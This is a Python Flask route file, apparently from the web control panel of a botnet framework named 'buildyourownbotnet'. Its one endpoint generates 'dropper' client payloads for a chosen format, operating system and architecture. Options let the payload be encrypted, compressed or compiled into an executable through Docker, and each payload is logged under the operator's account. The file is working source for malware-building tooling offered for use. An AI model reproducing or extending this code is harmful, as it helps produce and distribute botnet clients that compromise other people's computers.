import os
import subprocess
from flask import Blueprint, request, redirect, url_for, flash
from flask_login import login_user, logout_user, current_user, login_required
from buildyourownbotnet import client
from buildyourownbotnet.core import database

# Blueprint
payload = Blueprint('payload', __name__)

# Routes
@payload.route("/api/payload/generate", methods=["POST"])
@login_required
def payload_generate():
	"""Generates custom client scripts."""

	# required fields
	payload_format = request.form.get('format')
	operating_system = request.form.get('operating_system')
	architecture = request.form.get('architecture')

	# flash error message if user doesn't select a payload format
	if not payload_format:
		flash('Please select a payload format.', 'warning')
		return redirect(url_for('main.payloads'))

	# flash error message if user selects executable format without OS/arch
	if 'exe' in payload_format and (operating_system is None or architecture is None):
		flash('Please select an operating system and architecture to generate a binary executable.', 'warning')
		return redirect(url_for('main.payloads'))

	# optional fields
	encrypt = request.form.get('encrypt') if 'encrypt' in request.form else 0
	compress = request.form.get('compress') if 'compress' in request.form else 0
	freeze = 0 if 'py' in payload_format else 1

	if freeze and subprocess.check_call(['which','docker']) != 0:
		flash('Error: Docker is not installed or is not configured properly.')
		return redirect(url_for('payloads'))

	# write dropper to user's output directory and return client creation page
	options = {
		'encrypt': encrypt,
		'compress': compress, 
		'freeze': freeze, 
		'gui': 1, 
		'owner': current_user.username, 
		'operating_system': operating_system, 
		'architecture': architecture
	}

	try:
		outfile = client.main('', '', '', '', '', '', **options)

		# if pure python format, nullify os/arch before inserting record into database
		operating_system = 'py' if 'py' in payload_format else operating_system
		architecture = None if 'py' in payload_format else architecture

		# add payload to database
		database.add_payload(current_user.id, os.path.basename(outfile), operating_system, architecture)
		flash('Successfully generated payload: ' + os.path.basename(outfile), 'success')
	except Exception as e:
		flash('Error: compilation timed out or failed. Please go to the Discord support server for help.')
		print("Exception in api.routes.payload.payload_generate: " + str(e))
	return redirect(url_for('main.payloads'))